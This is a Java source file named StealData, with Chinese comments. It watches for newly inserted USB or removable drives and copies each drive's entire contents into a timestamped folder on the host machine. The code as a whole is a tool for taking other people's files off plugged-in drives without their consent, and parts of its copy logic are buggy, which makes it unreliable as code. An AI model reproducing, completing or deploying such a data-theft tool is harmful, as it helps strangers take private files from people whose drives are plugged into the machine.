package src.main.java.store;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class StealData {
    public static void main(String[] args) throws InterruptedException {
        steal("d:\\autoCopy");
    }


    //将插入的u盘的所有数据拷贝到指定目录中
    private static void steal(String dir) {
        File file = new File(dir);
        if (file.mkdirs())
            System.out.println("创建文件夹" + file.getPath() + "完成！");
        long sizeCopied = 0L;
        long totalFileSize = 0L;
        while (true) {
            String report = monitor();
            if (!report.equals("")) {
                System.out.println(report);
                if (report.contains("插入")) {
                    //根据当前时间创建一个文件夹
                    Date now = new Date();
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
                    String s = sdf.format(now);
                    String diskName = report.substring(2, 4);
                    //检测u盘信息，
                    File disk = new File(diskName);
                    totalFileSize = disk.getTotalSpace() - disk.getFreeSpace();
                    System.out.println("正在拷贝中...");
                    sizeCopied += copyDisk(diskName, dir + "\\" + s);
                    System.out.print("拷贝结束！");
                    System.out.print("本次总拷贝：");
                    System.out.printf("%5.2f", sizeCopied * 1.0 / 1024 / 1024 / 1024);
                    System.out.println("GB");
                    System.out.print("完成度为");
                    System.out.printf("%5.2f", sizeCopied * 1.0 / totalFileSize * 100);
                    System.out.println("%");
                }
            }
        }
    }

    //拷贝文件或文件夹（不包括里面的内容）到指定的目录,返回已拷贝的数据的大小。
    private static long copyFile(String absoluteName, String dir) {
        long size = 0L;
        File file = new File(absoluteName);
        if (file.exists()) {
            String fileName = file.getName();
            File newFile = new File(dir + fileName);
            //1.如果是文件夹，就在指定目录下新建同名的文件夹
            if (file.isDirectory()) {
                if (newFile.mkdir()) {
                    System.out.println("创建文件夹" + newFile.getPath() + "完成！");
                }
            }
            //2.如果是文件，就拷贝里面的内容
            try {
                if (file.isFile()) {
                    BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
                    byte[] buf = new byte[1024];
                    int len;
                    BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(newFile));
                    while ((len = bis.read(buf, 0, buf.length)) != -1) {
                        bos.write(buf, 0, len);
                    }
                    bos.flush();
                    bos.close();
                    bis.close();
                    size = file.length();
                    System.out.println("拷贝文件" + absoluteName + "完成！");
                    return size;
                }
            } catch (Exception e) {
                System.out.println("系统异常，复制中断");
            }
        }

        return size;
    }

    //拷贝指定文件夹,从dir到dir2,dir不能是根目录,返回已拷贝的数据的总大小
    private static long copyDir(String dir, String dir2) {
        long size = 0L;
        size += copyFile(dir, dir2);
        File file = new File(dir);
        File[] subFiles = file.listFiles();
        if (subFiles != null) {
            for (File subFile : subFiles) {
                size += copyFile(dir, dir2);
                if (subFile.isDirectory()) {
                    copyDir(subFile.getPath(), dir2 + file.getName() + "\\" + file.getParentFile().getName());
                }
                if (subFile.isFile()) {
                    size += copyFile(subFile.getPath(), dir2 + file.getName() + "\\" + file.getParentFile().getName());
                }
            }
        }
        return size;
    }

    //拷贝指定磁盘到dir2中
    private static long copyDisk(String disk, String dir2) {
        long size = 0L;
        String diskName = disk.substring(0, 1);
        String target = dir2 + "\\" + diskName + "\\";
        File targetFile = new File(target);
        if (targetFile.mkdirs()) {
            System.out.println("创建文件夹" + targetFile.getPath() + "完成！");
        }
        File source = new File(disk);
        size += copyFile(source.getPath(), target);
        File[] files = source.listFiles();
        if (files != null) {
            for (File file : files) {
                size += copyDir(file.getPath(), target);
            }
        }
        return size;
    }

    //传入一个保存了一秒钟前的磁盘列表和当前的磁盘列表的ArrayList，刷新它。
    private static ArrayList<File[]> flashDiskesArray(ArrayList<File[]> arrayList) {
        File[] files = File.listRoots();
        arrayList.add(files);
        ArrayList<File[]> newArrayList = null;
        if (arrayList.size() > 2) {
            newArrayList = new ArrayList<>();
            newArrayList.add(0, arrayList.get(arrayList.size() - 2));
            newArrayList.add(1, arrayList.get(arrayList.size() - 1));
        }
        return newArrayList;
    }

    //根据传入两个File数组，找出插入或弹出的盘符，并返回，如果没有就返回""
    private static String compare(File[] before, File[] now) {
        StringBuilder result = new StringBuilder("");
        if (before.length != now.length) {
            result.append(before.length > now.length ? "弹出" : "插入");
        }
        File[] longer = before.length > now.length ? before : now;
        File[] shorter = before.length < now.length ? before : now;
        for (File currentFile : longer) {
            Boolean findSameFile = false;
            for (File aShorter : shorter) {
                if (currentFile.compareTo(aShorter) == 0) {
                    findSameFile = true;
                }
            }
            //找到插入或弹出的盘符
            if (!findSameFile) {
                result.append(currentFile.getPath());
            }
        }
        return result.toString();
    }

    //监听系统中的磁盘添加或删除
    private static String monitor() {
        ArrayList<File[]> arrayList = new ArrayList<>();
        arrayList.add(File.listRoots());
        arrayList.add(File.listRoots());
        String result;
        while (true) {
            arrayList = flashDiskesArray(arrayList);
            result = compare(arrayList.get(0), arrayList.get(1));
            if (!result.equals("")) {
                break;
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        return result;
    }


}
